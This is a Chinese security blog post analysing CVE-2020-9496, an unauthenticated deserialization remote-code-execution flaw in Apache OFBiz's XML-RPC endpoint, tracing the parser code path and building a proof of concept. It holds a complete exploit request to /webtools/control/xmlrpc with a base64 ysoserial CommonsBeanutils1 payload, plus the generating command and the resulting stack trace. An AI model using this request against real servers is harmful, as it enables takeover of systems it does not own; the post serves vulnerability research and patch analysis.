<!DOCTYPE html>
<html lang="zh_cn">

<head>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="chrome=1">
<meta name="HandheldFriendly" content="True">
<meta name="MobileOptimized" content="320">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="referrer" content="no-referrer">
<meta name="description" content="一个孤独散步者的梦">


<meta property="twitter:title" content="CVE-2020-9496 Apache Ofbiz XMLRPC RCE漏洞分析">

    <meta property="twitter:card" content="summary">

<meta property="twitter:description" content="">

<title>


     诗与胡说 - CVE-2020-9496 Apache Ofbiz XMLRPC RCE漏洞分析 

</title>
<link rel="canonical" href="https://kylingit.com/blog/cve-2020-9496-apache-ofbiz-xmlrpc-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">


<link rel="stylesheet" href="https://kylingit.com/css/main.v0.9.1.css">
<link rel="stylesheet" href="https://kylingit.com/css/ionicons.min.css">


  <link rel="stylesheet" href="https://kylingit.com/css/highlight.min.css">



  <link rel="stylesheet" href="https://kylingit.com/css/progressively.min.css">





<link rel="shortcut icon"

    href="https://kylingit.com/img/favicon.png"

>




</head>


<body>


<section class="header">

    <div class="container">
        <a href="https://kylingit.com/"><img class="logo" src="https://kylingit.com/img/logo.jpg" alt="logo" /></a>
        <div class="content">
            <a href="https://kylingit.com/"><div class="name"><h1>诗与胡说</h1></div></a>
            <nav>
                <ul>
                    
                        <a href="https://kylingit.com/blog/"><li>Blog</li></a>
                    
                    
                        
                    
                        
                            
                            <a href="https://kylingit.com/about"><li>about</li></a>
                            
                        
                    
                        
                            
                        
                    
                        
                            
                            <a href="https://kylingit.com/projects"><li>projects</li></a>
                            
                        
                    
                    
                        
                            <a href="https://kylingit.com/notes/"><li>notes</li></a>
                        
                    
                        
                    
                </ul>
            </nav>
        </div>
    </div>
</section>


<section class="main post non-narrow zero-top-spacing">
    <div class="container">
        <div class="content">
            <div class="front-matter">
                <div class="title-container">
                    <div class="page-heading">

    CVE-2020-9496 Apache Ofbiz XMLRPC RCE漏洞分析

</div>

                </div>
                <div class="meta">
                    <div class="date" title="Tue Sep 22 2020 11:17:46 UTC">Sep 22, 2020</div>
                    <div class="reading-time"><div class="middot"></div>2 minutes read</div>
                </div>
            </div>
            <div class="markdown">
                
    
    

<script src="https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/pangu.js"></script>

<h2 id="环境搭建">环境搭建</h2>

<ul>
<li>下载：<a href="https://downloads.apache.org/ofbiz/">https://downloads.apache.org/ofbiz/</a></li>
<li>安装：在主目录下执行：

<ol>
<li><code>.\gradle\init-gradle-wrapper.ps1</code></li>
<li><code>gradlew.bat</code></li>
</ol></li>
</ul>

<h2 id="背景">背景</h2>

<h3 id="web路由">Web路由</h3>

<pre><code class="language-xml">&lt;!-- framework\webtools\webapp\webtools\WEB-INF\web.xml --&gt;
&lt;servlet&gt;
    &lt;description&gt;Main Control Servlet&lt;/description&gt;
    &lt;display-name&gt;ControlServlet&lt;/display-name&gt;
    &lt;servlet-name&gt;ControlServlet&lt;/servlet-name&gt;
    &lt;servlet-class&gt;org.apache.ofbiz.webapp.control.ControlServlet&lt;/servlet-class&gt;
    &lt;load-on-startup&gt;1&lt;/load-on-startup&gt;
&lt;/servlet&gt;
&lt;servlet-mapping&gt;
    &lt;servlet-name&gt;ControlServlet&lt;/servlet-name&gt;
    &lt;url-pattern&gt;/control/*&lt;/url-pattern&gt;
&lt;/servlet-mapping&gt;
</code></pre>

<p>根据web.xml定义的<code>servlet</code>，定位到<code>org.apache.ofbiz.webapp.control.ControlServlet</code></p>

<p>主要请求由<code>org.apache.ofbiz.webapp.control.RequestHandler#doRequest()</code>处理</p>

<p><img src="https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/image-20200921163908090.png" alt="image-20200921163908090" /></p>

<p>首先根据请求的url获取路由信息，默认有216个url路径（17.12.03版本）</p>

<p><img src="https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/image-20200921164034754.png" alt="image-20200921164034754" /></p>

<p>之后会根据<code>requestMap.event</code>信息去查找负责处理event的handler，之后再通过<code>invoke</code>进行具体的调用，该过程由<code>org.apache.ofbiz.webapp.control.RequestHandler#runEvent()</code>来完成</p>

<p><img src="https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/image-20200921164204132.png" alt="image-20200921164204132" /></p>

<p><img src="https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/image-20200921164502998.png" alt="image-20200921164502998" /></p>

<h3 id="xml-rpc消息">XML-RPC消息</h3>

<h4 id="xml-rpc数据类型">XML-RPC数据类型</h4>

<ul>
<li>文档：<a href="https://ws.apache.org/xmlrpc/types.html">https://ws.apache.org/xmlrpc/types.html</a></li>
</ul>

<p>根据文档，xmlrpc支持多种数据类型，对应的xml标签包括<code>base64</code>、<code>struct</code>、<code>array</code>等</p>

<p><img src="https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/image-20200921165252225.png" alt="image-20200921165252225" /></p>

<p>下面是几种常见的数据类型</p>

<pre><code class="language-xml">&lt;!-- array --&gt;
&lt;value&gt;
  &lt;array&gt;
    &lt;data&gt;
      &lt;value&gt;&lt;int&gt;7&lt;/int&gt;&lt;/value&gt;
    &lt;/data&gt;
  &lt;/array&gt;
&lt;/value&gt;


&lt;!-- struct --&gt;
&lt;struct&gt; 
  &lt;member&gt; 
    &lt;name&gt;foo&lt;/name&gt; 
    &lt;value&gt;bar&lt;/value&gt; 
  &lt;/member&gt; 
&lt;/struct&gt;
</code></pre>

<h4 id="xml-rpc消息格式">XML-RPC消息格式</h4>

<ul>
<li>文档：<a href="http://xmlrpc.com/spec.md">http://xmlrpc.com/spec.md</a></li>
</ul>

<p>每个XML-RPC请求都以<code>&lt;methodCall&gt;&lt;/methodCall&gt;</code>开头，该元素包含单个子元素<code>&lt;methodName&gt;method&lt;/methodName&gt;</code>，元素<code>&lt;methodName&gt;</code>包含子元素<code>&lt;params&gt;</code>，<code>&lt;params&gt;</code>可以包含一个或多个<code>&lt;param&gt;</code>元素。如：</p>

<pre><code>POST /RPC2 HTTP/1.0
User-Agent: Frontier/5.1.2 (WinNT)
Host: betty.userland.com
Content-Type: text/xml
Content-length: 181

&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
&lt;methodCall&gt; 
  &lt;methodName&gt;examples.getStateName&lt;/methodName&gt;  
  &lt;params&gt; 
    &lt;param&gt; 
      &lt;value&gt;
        &lt;i4&gt;41&lt;/i4&gt;
      &lt;/value&gt; 
    &lt;/param&gt; 
  &lt;/params&gt; 
&lt;/methodCall&gt;
</code></pre>

<h2 id="漏洞分析">漏洞分析</h2>

<p>CVE-2020-9496</p>

<ul>
<li>漏洞信息：<a href="https://securitylab.github.com/advisories/GHSL-2020-069-apache_ofbiz">https://securitylab.github.com/advisories/GHSL-2020-069-apache_ofbiz</a></li>
<li>补丁：<a href="https://github.com/apache/ofbiz-framework/commit/4bdfb54ffb6e05215dd826ca2902c3e31420287a">https://github.com/apache/ofbiz-framework/commit/4bdfb54ffb6e05215dd826ca2902c3e31420287a</a></li>
</ul>

<p><img src="https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/image-20200921164745933.png" alt="image-20200921164745933" /></p>

<p>根据补丁发现<code>framework\webtools\webapp\webtools\WEB-INF\controller.xml</code>中的<code>xmlrpc</code>请求增加了<code>&lt;security auth=&quot;true&quot;/&gt;</code>的认证，说明默认情况下该接口访问无需认证</p>

<pre><code class="language-xml">&lt;!-- framework\webtools\webapp\webtools\WEB-INF\controller.xml --&gt;
&lt;request-map uri=&quot;xmlrpc&quot; track-serverhit=&quot;false&quot; track-visit=&quot;false&quot;&gt;
    &lt;security https=&quot;false&quot;/&gt;
    &lt;event type=&quot;xmlrpc&quot;/&gt;
    &lt;response name=&quot;error&quot; type=&quot;none&quot;/&gt;
    &lt;response name=&quot;success&quot; type=&quot;none&quot;/&gt;
&lt;/request-map&gt;
</code></pre>

<h3 id="调用方法">调用方法</h3>

<p>直接构造post请求发送</p>

<pre><code>POST /webtools/control/xmlrpc HTTP/1.1
Host: 127.0.0.1:8443
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/xml
Content-Length: 181

&lt;?xml version=&quot;1.0&quot;?&gt;
&lt;methodCall&gt;
  &lt;methodName&gt;testMethod&lt;/methodName&gt;
  &lt;params&gt;
    &lt;param&gt;
      &lt;value&gt;test&lt;/value&gt;
    &lt;/param&gt;
  &lt;/params&gt;
&lt;/methodCall&gt;
</code></pre>

<p>发现报错<code>org.apache.xmlrpc.server.XmlRpcNoSuchHandlerException: No such service [testMethod]</code>说明没有相关的方法</p>

<p>下断点调试一下，由上面的<code>org.apache.ofbiz.webapp.event.XmlRpcEventHandler#invoke()</code>进入<code>execute()</code>，接着调用<code>org.apache.xmlrpc.server.XmlRpcServer#execute()</code></p>

<p><img src="https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/image-20200921171252973.png" alt="image-20200921171252973" /></p>

<p>跟入<code>XmlRpcServer#execute()</code>，发现调用了<code>org.apache.xmlrpc.server.XmlRpcServerWorker#execute()</code>，由具体的event handler处理XML-RPC请求</p>

<p><img src="https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/image-20200921171443304.png" alt="image-20200921171443304" /></p>

<p>在<code>org.apache.ofbiz.webapp.event.XmlRpcEventHandler.ServiceRpcHandler#getHandler()</code>中获取Handler对应的<code>ModelService</code>，默认注册的service有3000多个，也就是可供调用的<code>methodName</code>，如果找不到service会抛出<code>No such service</code>的异常</p>

<p><img src="https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/image-20200921171738522.png" alt="image-20200921171738522" /></p>

<p>所以此处传入一个已注册的service</p>

<p>回到<code>org.apache.xmlrpc.server.XmlRpcServerWorker#execute()</code>，当成功查询到service后通过<code>handler.execute(pRequest)</code>进行调用，注意此处还会检查一次<code>ModelService</code>的<code>export</code>属性，因此通过遍历serviceMap找到一个<code>export</code>为<code>true</code>的方法，如<code>ping</code></p>

<p><img src="https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/image-20200921172937855.png" alt="image-20200921172937855" /></p>

<p>继续构造请求（下面会解释为什么需要struct块）</p>

<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
&lt;methodCall&gt;
  &lt;methodName&gt;ping&lt;/methodName&gt;
  &lt;params&gt;
    &lt;param&gt;
      &lt;value&gt;
        &lt;struct&gt;
          &lt;member&gt;
            &lt;name&gt;foo&lt;/name&gt;
            &lt;value&gt;aa&lt;/value&gt;
          &lt;/member&gt;
        &lt;/struct&gt;
      &lt;/value&gt;
    &lt;/param&gt;
  &lt;/params&gt;
&lt;/methodCall&gt;
</code></pre>

<p>响应</p>

<pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;methodResponse xmlns:ex=&quot;http://ws.apache.org/xmlrpc/namespaces/extensions&quot;&gt;&lt;params&gt;&lt;param&gt;&lt;value&gt;&lt;struct&gt;&lt;member&gt;&lt;name&gt;message&lt;/name&gt;&lt;value&gt;PONG&lt;/value&gt;&lt;/member&gt;&lt;/struct&gt;&lt;/value&gt;&lt;/param&gt;&lt;/params&gt;&lt;/methodResponse&gt;
</code></pre>

<p>说明成功调用ping方法</p>

<h3 id="反序列化点">反序列化点</h3>

<p>在<code>Ofbiz</code>自带的第三方库<code>xmlrpc-common-3.1.3.jar</code>中的<code>org.apache.xmlrpc.parser.SerializableParser</code>类能明显地看到对数据的还原操作，如果gadget到达此处能直接被反序列化而不会被过滤。</p>

<p><img src="https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/image-20200921180634383.png" alt="image-20200921180634383" /></p>

<h3 id="解析xml">解析XML</h3>

<p>回到<code>org.apache.ofbiz.webapp.control.RequestHandler#runEvent()</code>方法，在其随后调用的链中，注意到<code>getRequest()</code>方法</p>

<pre><code>org.apache.ofbiz.webapp.control.RequestHandler.runEvent()
  org.apache.ofbiz.webapp.event.XmlRpcEventHandler.invoke()
    org.apache.ofbiz.webapp.event.XmlRpcEventHandler.execute()
      org.apache.ofbiz.webapp.event.XmlRpcEventHandler.getRequest()
</code></pre>

<p>在getRequest()中，传入的xml数据由第三方库<code>xmlrpc-common.jar</code>来进行解析（注意到此处做了XXE防护）</p>

<p><img src="https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/image-20200921174933501.png" alt="image-20200921174933501" /></p>

<p>该类的初始化由父类<code>org.apache.xmlrpc.parser.RecursiveTypeParserImpl</code>完成，顾名思义就是递归解析，其他的便是常规的xml元素解析操作，包括<code>startElement()</code>、<code>endElement()</code>等。我们知道在解析器解析xml数据的过程中，会触发到<code>scanDocument()</code>操作对元素进行逐一“扫描”，其中就会进行<code>startElement()</code>、<code>endElement()</code>的调用，这个过程如果处理不当就会引入问题。</p>

<p><img src="https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/image-20200921181123956.png" alt="image-20200921181123956" /></p>

<p>注意到在<code>endElement()</code>方法中对于<code>value</code>标签的处理，同样由父类完成，跟入<code>org.apache.xmlrpc.parser.RecursiveTypeParserImpl#endValueTag()</code></p>

<p><img src="https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/image-20200921181252917.png" alt="image-20200921181252917" /></p>

<p>在<code>endValueTag()</code>调用了<code>getResult()</code>方法，而这个方法就是上面提到的反序列化目标方法，那么接下来就是构造xml数据发送给<code>Ofbiz</code>，如果<code>value</code>的标签中存放的值为序列化数据，那么会由<code>SerializableParser</code>类进行反序列化进而触发漏洞，调用链是这个样子的</p>

<pre><code>org.apache.ofbiz.webapp.event.XmlRpcEventHandler.getRequest()
  org.apache.xerces.parsers.AbstractSAXParser.parse()
    org.apache.xerces.impl.XMLDocumentFragmentScannerImpl.scanDocument()
      org.apache.xmlrpc.parser.XmlRpcRequestParser.endElement()
        org.apache.xmlrpc.parser.RecursiveTypeParserImpl.endElement()
          org.apache.xmlrpc.parser.MapParser.endElement()
            org.apache.xmlrpc.parser.RecursiveTypeParserImpl.endValueTag()
              org.apache.xmlrpc.parser.SerializableParser.getResult()
</code></pre>

<h3 id="poc构造">PoC构造</h3>

<p>接下来的问题就是如何构造出特定的xml数据</p>

<p>以上面的ping方法为例，假设post如下数据</p>

<pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot;?&gt;
&lt;methodCall&gt;
  &lt;methodName&gt;ping&lt;/methodName&gt;
  &lt;params&gt;
    &lt;param&gt;
      &lt;value&gt;test&lt;/value&gt;
    &lt;/param&gt;
  &lt;/params&gt;
&lt;/methodCall&gt;
</code></pre>

<p><code>Ofbiz</code>成功解析到<code>endValueTag()</code>方法，但是由于<code>typeParser</code>属性为空，因此不会进入<code>getResult()</code>方法</p>

<p><img src="https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/image-20200921183246986.png" alt="image-20200921183246986" /></p>

<p>那么<code>typeParser</code>属性是在哪里赋值的呢？</p>

<p>回到<code>org.apache.xmlrpc.parser.XmlRpcRequestParser#startElement()</code>，在解析器解析xml标签时，对4类标签（methodCall、params、param、value）有分别的处理，这个处理过程是随着每次遍历标签进行的，当扫描完4个必须提供的标签后，会调用父类的<code>startElement()</code>进行处理，而typeParser就是在父类中完成赋值的，随后便通过不同的解析器进入不同的解析流程，还是会调用对应解析器的<code>startElement</code>，这个过程是递归的</p>

<p><img src="https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/image-20200921183456809.png" alt="image-20200921183456809" /></p>

<p><img src="https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/image-20200921183856009.png" alt="image-20200921183856009" /></p>

<p>分析扫描标签的递增过程，发现此处除了4个标签外，还需在<code>&lt;value&gt;</code>标签中含有额外的标签，才会进入default分支进而对<code>typeParser</code>赋值，此时struct就是一个很好的选择，它能把数据作为一个结构体传入。</p>

<p>接着思考如何传入序列化数据，也即如何控制后端通过<code>SerializableParser</code>解析数据</p>

<p>还是关注typeParser的赋值过程，这个属性就是最终将要处理不同类型数据的解析器，在<code>org.apache.xmlrpc.parser.RecursiveTypeParserImpl#startElement()</code>中，注意到<code>factory.getParser()</code>操作，将由<code>org.apache.xmlrpc.common.TypeFactoryImpl</code>类获得不同数据类型的解析类，在其中就有获取<code>SerializableParser</code>的过程</p>

<p><img src="https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/image-20200921185008145.png" alt="image-20200921185008145" /></p>

<p>因此只要传入<code>&lt;serializable&gt;</code>标签便会由<code>SerializableParser</code>进行解析。</p>

<p>此时还有个前提条件，那就是标签属性必须带有<code>XmlRpcWriter.EXTENSIONS_URI</code>才会进入后续的判断流程，因此post的数据是这样子的：</p>

<pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot;?&gt;
&lt;methodCall&gt;
  &lt;methodName&gt;ping&lt;/methodName&gt;
  &lt;params&gt;
    &lt;param&gt;
      &lt;value&gt;
        &lt;struct&gt;
          &lt;member&gt;
            &lt;name&gt;foo&lt;/name&gt;
            &lt;value&gt;
              &lt;serializable xmlns=&quot;http://ws.apache.org/xmlrpc/namespaces/extensions&quot;&gt;serialized_data&lt;/serializable&gt;
            &lt;/value&gt;
          &lt;/member&gt;
        &lt;/struct&gt;
      &lt;/value&gt;
    &lt;/param&gt;
  &lt;/params&gt;
&lt;/methodCall&gt;
</code></pre>

<p>最后一步，数据的格式</p>

<p>在获取到<code>SerializableParser</code>解析器后，startElement过程由父类<code>org.apache.xmlrpc.parser.ByteArrayParser#startElement()</code>完成，在其中能看到base64的解码操作，所以最终的序列化数据是需要通过base64传输的</p>

<p><img src="https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/image-20200922105244816.png" alt="image-20200922105244816" /></p>

<h3 id="漏洞利用">漏洞利用</h3>

<p><code>Ofbiz</code>中存在Commons-Beanutils库，所以使用ysoserial直接生成CommonsBeanutils1的payload</p>

<pre><code>&gt; java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsBeanutils1 calc | base64 |tr -d &quot;\n&quot;
rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAK29yZy5hcGFjaGUuY29tbW9ucy5iZ...
</code></pre>

<p>填充serialized_data并发送</p>

<p><img src="https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/image-20200921191012365.png" alt="image-20200921191012365" /></p>

<p>调用链</p>

<pre><code>java.lang.RuntimeException: InvocationTargetException: java.lang.reflect.InvocationTargetException
	at org.apache.commons.beanutils.BeanComparator.compare(BeanComparator.java:171) ~[commons-beanutils-1.9.3.jar:1.9.3]
	at java.util.PriorityQueue.siftDownUsingComparator(PriorityQueue.java:721) ~[?:1.8.0_141]
	at java.util.PriorityQueue.siftDown(PriorityQueue.java:687) ~[?:1.8.0_141]
	at java.util.PriorityQueue.heapify(PriorityQueue.java:736) ~[?:1.8.0_141]
	at java.util.PriorityQueue.readObject(PriorityQueue.java:795) ~[?:1.8.0_141]
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) ~[?:1.8.0_141]
	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) ~[?:1.8.0_141]
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) ~[?:1.8.0_141]
	at java.lang.reflect.Method.invoke(Method.java:498) ~[?:1.8.0_141]
	at java.io.ObjectStreamClass.invokeReadObject(ObjectStreamClass.java:1058) ~[?:1.8.0_141]
	at java.io.ObjectInputStream.readSerialData(ObjectInputStream.java:2136) ~[?:1.8.0_141]
	at java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:2027) ~[?:1.8.0_141]
	at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1535) ~[?:1.8.0_141]
	at java.io.ObjectInputStream.readObject(ObjectInputStream.java:422) ~[?:1.8.0_141]
	at org.apache.xmlrpc.parser.SerializableParser.getResult(SerializableParser.java:36) ~[xmlrpc-common-3.1.3.jar:3.1.3]
	at org.apache.xmlrpc.parser.RecursiveTypeParserImpl.endValueTag(RecursiveTypeParserImpl.java:78) ~[xmlrpc-common-3.1.3.jar:3.1.3]
	at org.apache.xmlrpc.parser.MapParser.endElement(MapParser.java:185) ~[xmlrpc-common-3.1.3.jar:3.1.3]
	at org.apache.xmlrpc.parser.RecursiveTypeParserImpl.endElement(RecursiveTypeParserImpl.java:103) ~[xmlrpc-common-3.1.3.jar:3.1.3]
	at org.apache.xmlrpc.parser.XmlRpcRequestParser.endElement(XmlRpcRequestParser.java:165) ~[xmlrpc-common-3.1.3.jar:3.1.3]
	at org.apache.xerces.parsers.AbstractSAXParser.endElement(Unknown Source) ~[xercesImpl-2.9.1.jar:?]
	at org.apache.xerces.impl.XMLNSDocumentScannerImpl.scanEndElement(Unknown Source) ~[xercesImpl-2.9.1.jar:?]
	at org.apache.xerces.impl.XMLDocumentFragmentScannerImpl$FragmentContentDispatcher.dispatch(Unknown Source) ~[xercesImpl-2.9.1.jar:?]
	at org.apache.xerces.impl.XMLDocumentFragmentScannerImpl.scanDocument(Unknown Source) ~[xercesImpl-2.9.1.jar:?]
	at org.apache.xerces.parsers.XML11Configuration.parse(Unknown Source) ~[xercesImpl-2.9.1.jar:?]
	at org.apache.xerces.parsers.XML11Configuration.parse(Unknown Source) ~[xercesImpl-2.9.1.jar:?]
	at org.apache.xerces.parsers.XMLParser.parse(Unknown Source) ~[xercesImpl-2.9.1.jar:?]
	at org.apache.xerces.parsers.AbstractSAXParser.parse(Unknown Source) ~[xercesImpl-2.9.1.jar:?]
	at org.apache.xerces.jaxp.SAXParserImpl$JAXPSAXParser.parse(Unknown Source) ~[xercesImpl-2.9.1.jar:?]
	at org.apache.ofbiz.webapp.event.XmlRpcEventHandler.getRequest(XmlRpcEventHandler.java:285) ~[ofbiz.jar:?]
	at org.apache.ofbiz.webapp.event.XmlRpcEventHandler.execute(XmlRpcEventHandler.java:229) [ofbiz.jar:?]
	at org.apache.ofbiz.webapp.event.XmlRpcEventHandler.invoke(XmlRpcEventHandler.java:145) [ofbiz.jar:?]
	at org.apache.ofbiz.webapp.control.RequestHandler.runEvent(RequestHandler.java:741) [ofbiz.jar:?]
	at org.apache.ofbiz.webapp.control.RequestHandler.doRequest(RequestHandler.java:465) [ofbiz.jar:?]
	at org.apache.ofbiz.webapp.control.ControlServlet.doGet(ControlServlet.java:217) [ofbiz.jar:?]
	at org.apache.ofbiz.webapp.control.ControlServlet.doPost(ControlServlet.java:91) [ofbiz.jar:?]
</code></pre>

<script>pangu.spacingPage();</script>


                <br>
                <p><a href="https://kylingit.com/blog">Back to posts</a></p>
            </div>
            <br>
            <div class="disqus">
                <div id="disqus_thread"></div>
<script type="text/javascript">
    var disqus_shortname = 'kylingit';
    var disqus_identifier = 'https:\/\/kylingit.com\/blog\/cve-2020-9496-apache-ofbiz-xmlrpc-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90\/';
    var disqus_title = 'CVE-2020-9496 Apache Ofbiz XMLRPC RCE漏洞分析';
    var disqus_url = 'https:\/\/kylingit.com\/blog\/cve-2020-9496-apache-ofbiz-xmlrpc-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90\/';

    (function() {
        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
<a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
            </div>
        </div>
    </div>
</section>

<section class="footer">
    <div class="container">
        <div class="copyright">

        
            <a href="https://kylingit.com/license">Copyright © 2020 kylinking</a>
        

        </div>
        <div class="icons">

        
            <a href="https://github.com/kylingit" target="_blank">
                <i class="icon ion-social-github" title="github"></i>
            </a>
        

        

        

        
            <a href="mailto:ikylinking@gmail.com">
                <i class="icon ion-ios-email larger" title="email"></i>
            </a>
        

        
            <a href="https://kylingit.com/index.xml">
                <i class="icon ion-social-rss larger" title="rss"></i>
            </a>
        

        </div>
    </div>
</section>


  <script src="https://kylingit.com/js/highlight.min.js" defer></script>
  



  <script src="https://kylingit.com/js/progressively.min.js" defer></script>


<script>
  window.onload = function() {
    
      hljs.initHighlighting();
    
    
      progressively.init({delay: 30, throttle: 50});
    
  };
</script>

</body>
</html>

